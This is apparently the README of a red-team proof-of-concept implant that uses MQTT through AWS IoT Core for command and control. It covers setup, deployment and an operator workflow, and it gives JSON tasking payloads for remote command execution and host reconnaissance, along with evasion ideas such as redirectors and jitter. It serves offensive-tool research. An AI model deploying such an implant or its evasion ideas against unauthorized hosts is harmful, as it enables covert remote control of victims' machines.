# Sukoshi | 少し

## Overview
Sukoshi is a proof-of-concept Python/C++ implant that leverages the [MQTT protocol](https://mqtt.org/) for C2 and uses AWS [IoT Core](https://aws.amazon.com/iot-core/) as infrastructure. It is intended to demonstrate the use of MQTT for C2 and the way in which IoT cloud services can be integrated with an implant.

***Note: This project was not built to be used in a production setting. It is designed as a proof-of-concept and it intentionally omits many features that would be expected in a modern C2 project. For OPSEC considerations, see [here](#opsec-considerations).***

![screen_0](https://i.imgur.com/tHbRiHj.png)

## Features
* Automated setup and deployment of an implant using MQTT for C2. Can be used to easily test and analyze an implant leveraging this protocol.
* Connects AWS IoT Core to an implant. Can be further expanded to integrate AWS services such as [IoT Analytics](https://aws.amazon.com/iot-analytics/) for logging/data analysis/visualization and [IoT Events](https://aws.amazon.com/iot-events/) for automated response to significant data events.

### IoT Services for C2
C2 operators face many challenges such as having to manage a fleet of agents, implement a secure communications channel, quickly respond to events and log/analyze/visualize data. These same issues are being addressed by cloud providers who offer IoT services. As a result, they can be leveraged for C2 and implant management. This project uses AWS IoT Core as infrastructure, but other providers could possibly be re-purposed for C2 as well ([Azure IoT](https://azure.microsoft.com/en-ca/overview/iot/), [HiveMQ](https://www.hivemq.com/mqtt-cloud-broker/)).

AWS has implemented sophisticated IoT services and capabilities that can be readily adapted for C2. As an example, telemetry from operators and implants can be stored, prepared, analyzed and fed into machine learning models using IoT Analytics. The [IoT Device Defender](https://aws.amazon.com/iot-device-defender/) service can be used to run regular audits on deployed implants, check for anomalous activity and produce alerts.

Telemetry gathered in IoT Core is not restricted to IoT services. Using [Rules for AWS IoT](https://docs.aws.amazon.com/iot/latest/developerguide/iot-rules.html), your implant data can be forwarded to many other services in the AWS ecosystem. You can do things like pass the data to Lambda functions, store it in DynamoDB or S3, send the data to Amazon Machine Learning to make predictions based on an Amazon ML model, start execution of a Step Functions state machine, and much more.

I believe that this project only scratches the surface of what can be done with cloud IoT service providers. The time saved by not needing to implement these capabilities by yourself is enormous. You can instantly get access to sophisticated services that are highly benficial to C2 operators.

## Setup

### Python Requirements
The AWS IoT Python libraries are needed by the implant and can be installed with the steps below:
1. From the root of the Sukoshi project, navigate to the `/python` directory
2. Execute the following command to install the Python dependencies:
```
pip install -r requirements.txt
```

### C++ Requirements

#### Build Environment
* A Windows 10 host was used as the environment for testing/compilation. 
* Visual Studio 2019 was used for development of this project.
* The Visual Studio package [Desktop Development with C++](https://devblogs.microsoft.com/cppblog/windows-desktop-development-with-c-in-visual-studio) was installed to support building the implant in C++. 
* CMake was used to build and install the required AWS IoT libraries, it can be installed [here](https://cmake.org/download).
* vcpkg was used to build and install the required Boost Property Tree libraries, it can be installed [here](https://github.com/microsoft/vcpkg#quick-start-windows).
* Git is needed to fetch the required libraries from GitHub and can be installed for Windows [here](https://gitforwindows.org).

The [AWS IoT C++ libraries](https://github.com/aws/aws-iot-device-sdk-cpp-v2) and [Boost Property Tree libraries](https://www.boost.org/doc/libs/1_78_0/doc/html/property_tree.html) are needed by the implant and can be installed with the steps below:

#### Automated Installation
I've used the script located [here](/scripts/install_aws_cpp_deps.ps1) to automate installation of the AWS IoT libaries on my host. I've used the script located [here](/scripts/install_boost_cpp_deps.ps1) to automate installation of vcpkg and the Boost Property Tree libaries on my host. You may be able to use these scripts to perform the same automated installs on your host or you can use them as a template for your own custom installation.

#### Manual Installation

To build the AWS IoT C++ libraries, create a directory within a short path (e.g. `C:\dev\iotsdk`), navigate into the newly created directory and execute the following commands:
```
mkdir sdk-cpp-workspace
cd sdk-cpp-workspace
git clone --recursive https://github.com/aws/aws-iot-device-sdk-cpp-v2.git
mkdir aws-iot-device-sdk-cpp-v2-build
cd aws-iot-device-sdk-cpp-v2-build
cmake -DCMAKE_INSTALL_PREFIX="C:\dev\iotsdk\sdk-cpp-workspace" ../aws-iot-device-sdk-cpp-v2
cmake --build . --target install --config "Release"
```

To build the Boost Property Tree libraries, navigate to the location of your vcpkg install and execute the following commands:
```
.\vcpkg.exe install boost-property-tree:x64-windows
.\vcpkg.exe integrate install
```

#### C++ Library Integration
The included Visual Studio project should be pre-configured to include all the required directories and dependencies. It has been hardcoded with the `C:\dev\iotsdk\sdk-cpp-workspace` path for the AWS IoT SDK dependencies. If you would like to select an alternative path for these dependencies, perform the following steps where `C:\dev\iotsdk\sdk-cpp-workspace` is replaced with your custom installation path:
1. Set the following flags in the solution: `Release`, `x64`
2. In project properties, set "C/C++ > General > Additional Include Directories" to `C:\dev\iotsdk\sdk-cpp-workspace\include`
3. In project properties, set "Linker > Input > Additional Dependencies" to:
```
C:\dev\iotsdk\sdk-cpp-workspace\lib\aws-crt-cpp.lib
C:\dev\iotsdk\sdk-cpp-workspace\lib\aws-c-mqtt.lib
C:\dev\iotsdk\sdk-cpp-workspace\lib\aws-c-event-stream.lib
C:\dev\iotsdk\sdk-cpp-workspace\lib\aws-checksums.lib
C:\dev\iotsdk\sdk-cpp-workspace\lib\aws-c-s3.lib
C:\dev\iotsdk\sdk-cpp-workspace\lib\aws-c-auth.lib
C:\dev\iotsdk\sdk-cpp-workspace\lib\aws-c-http.lib
C:\dev\iotsdk\sdk-cpp-workspace\lib\aws-c-io.lib
Secur32.lib
Crypt32.lib
C:\dev\iotsdk\sdk-cpp-workspace\lib\aws-c-compression.lib
C:\dev\iotsdk\sdk-cpp-workspace\lib\aws-c-cal.lib
NCrypt.lib
C:\dev\iotsdk\sdk-cpp-workspace\lib\aws-c-sdkutils.lib
C:\dev\iotsdk\sdk-cpp-workspace\lib\aws-c-common.lib
BCrypt.lib
Kernel32.lib
Ws2_32.lib
Shlwapi.lib
kernel32.lib
user32.lib
gdi32.lib
winspool.lib
shell32.lib
ole32.lib
oleaut32.lib
uuid.lib
comdlg32.lib
advapi32.lib
```
4. In project properties, set "C/C++ > Language > Conformance mode" to `No (/permissive)`. Otherwise, when you try to execute a build, you will get an error for the file `StringView.h` on line 861:
```
Error	C7527	'Traits': template parameter name cannot be redeclared
```
* If you are interested in tracking the status of this issue, see the following: https://github.com/aws/aws-iot-device-sdk-cpp-v2/issues/372

### Terraform
This project includes Terraform files to automate deployment of the AWS IoT Core infrastructure that is needed by the implant.

The following resources will be created in the target AWS account:
* AWS IoT Certificate
* AWS IoT Policy
* AWS IoT Thing

The certificates needed to connect the implant with AWS infrastructure will be created in the `/terraform/certs` folder.

The process for setting this up is as follows:
1. Ensure you have Terraform setup and installed (https://learn.hashicorp.com/tutorials/terraform/install-cli)
2. Ensure you have AWS user credentials with the proper IAM permissions configured on the CLI (https://docs.aws.amazon.com/cli/latest/userguide/getting-started-quickstart.html). For testing purposes, you can attach the managed policy [AWSIoTConfigAccess](https://console.aws.amazon.com/iam/home#/policies/arn:aws:iam::aws:policy/AWSIoTConfigAccess$jsonEditor?section=permissions) to the user.
3. From the command line, navigate to the `/terraform` folder
4. Execute the following commands to setup the required infrastructure using Terraform: 
```
terraform init
terraform plan
terraform apply
```
5. Take note of the `python_implant_command_line` and `cpp_implant_command_line` output from Terraform, it will be used to start the implant builds for Python and C++ respectively
7. Execute the following command to destroy the infrastructure when finished testing:
```
terraform destroy
```

## Usage
The implant has been configured with very basic functionality to demonstrate the usage of MQTT for C2 and integration with AWS IoT Core. For simplicity, interaction with the implant by an operator is primarily done through the [MQTT test client](https://docs.aws.amazon.com/iot/latest/developerguide/view-mqtt-messages.html) in the AWS IoT Core console page.

The following is an example of the end-to-end flow for the implant C2:
1. Navigate to the AWS IoT Core console page
2. Under the "Test" dropdown in the sidebar, click "MQTT test client"
3. On the "Subscribe to a topic" tab in the "Topic filter" field, enter `c2/results` as a topic and click "Subscribe". Note that `c2/results` appears under the "Subscriptions" window.
4. Repeat the above step for the `c2/tasking` and `c2/heartbeat` topics. For convenience, you may choose to favorite each of these subscribed topics by clicking the heart icon.
5. There are two builds of the implant (Python/C++) and their execution instructions will vary: 
* For Python, navigate to the root directory of Sukoshi and start the implant by executing the command line obtained from the Terraform output (`python_implant_command_line`), a sample can be seen below:
```
python ./python/implant.py --endpoint example-ats.iot.us-east-1.amazonaws.com --cert terraform/certs/sukoshi_implant.cert.pem --key terraform/certs/sukoshi_implant.private.key --client-id sukoshi_client_id --port 443
```
* For C++, compile the implant by opening the Visual Studio solution (`/cpp/Sukoshi/Sukoshi.sln`) and building with `Release`, `x64` flags. Start the implant by opening a PowerShell terminal window, navigating to the root directory of Sukoshi and executing the command line obtained from the Terraform output (`cpp_implant_command_line`), a sample can be seen below:
```
./cpp/Sukoshi/x64/Release/Sukoshi.exe --endpoint example-ats.iot.us-east-1.amazonaws.com --cert terraform/certs/sukoshi_implant.cert.pem --key terraform/certs/sukoshi_implant.private.key --client-id sukoshi_client_id --port 443
```
6. Observe that output begins to appear in the `c2/heartbeat` channel
7. Click on the "Publish to a topic" tab and enter `c2/tasking` in the "Topic name" field
8. In the "Message payload" field, enter the following:
```
{
  "task": "ping",
  "arguments": ""
}
```
9. Click the "Publish" button and observe that the task is published to the `c2/tasking` topic in "Subscriptions"
10. Observe the implant receiving the task, performing the work and publishing results. The following sample is from the Python build:
```
Publishing message to topic 'c2/heartbeat': {"contents": "heartbeat", "success": "true"}
Received message from topic 'c2/tasking': b'{\n  "task": "ping",\n  "arguments": ""\n}'
Publishing message to topic 'c2/heartbeat': {"contents": "heartbeat", "success": "true"}
Publishing message to topic 'c2/results': {"contents": "pong", "success": "true"}
```
11. Observe the results appear in the `c2/results` topic:
```
{
  "contents": "pong",
  "success": "true"
}
```
12. To view other sample tasking payloads, see the [Supported Tasks](#supported-tasks) section. Tasking format will be the same for both Python and C++ builds.

## Screenshots

#### Accessing the MQTT test client to send tasks/view results
![screen_1](https://i.imgur.com/pqLg2pk.png)

#### Subscribing to topics
![screen_2](https://i.imgur.com/WyilvlF.png)

#### Publishing tasks and viewing results
![screen_3](https://i.imgur.com/zXFrBvv.png)

## Supported Tasks
The following are sample payloads for supported tasks you can paste into the "Message payload" field within the AWS "MQTT test client" page.

### Command Execution
Execute an OS command and retrieve the results. In this case, the `whoami` command is provided.
```
{
  "task": "exec",
  "arguments": "whoami"
}
```

### Host Reconaissance
Gather basic details about the host where the implant is running, including host name and OS info.
```
{
  "task": "host-recon",
  "arguments": ""
}
```

### Ping
Send a ping and get back a pong. Simple task used to validate end-to-end C2.
```
{
  "task": "ping",
  "arguments": ""
}
```

### Configure Dwell Time
Set the time the implant should wait before executing tasks and returning results. Time is in seconds.
```
{
  "task": "set-dwell-time",
  "arguments": "10"
}
```

### Exit
Ask the implant to end the beaconing loop and disconnect from the endpoint.
```
{
  "task": "exit",
  "arguments": ""
}
```

## OPSEC Considerations
Due to the PoC nature of this project, it was not built with OPSEC in mind. However, I will outline some possible features that could be present in a production deployment of this kind of project:
* Automated setup of redirectors to obscure the AWS IoT endpoint
* Overhaul of command execution tasking to support stealthier implementations
* Leverage alternate IoT cloud service providers as a fallback
* Variable beaconing using jitter
* Encryption of tasking and results in the event that the communications channel is compromised

## Credits
* Daniel Abeles ([@Daniel_Abeles](https://twitter.com/daniel_abeles)) and Moshe Zioni for their work while at Akamai Threat Research. Their MQTT-PWN project served as an excellent reference during development: 
    * https://github.com/akamai-threat-research/mqtt-pwn
    * https://mqtt-pwn.readthedocs.io/en/latest/plugins/c2.html
* Soracom Labs, for the Terraform AWS IoT setup files: https://github.com/soracom-labs/soracom-beam-to-aws-iot-terraform
* AWS for their IoT Device SDK sample code: 
    * Python: https://github.com/aws/aws-iot-device-sdk-python-v2/blob/main/samples/pubsub.py
    * C++: https://github.com/aws/aws-iot-device-sdk-cpp-v2/blob/main/samples/mqtt/basic_pub_sub/main.cpp
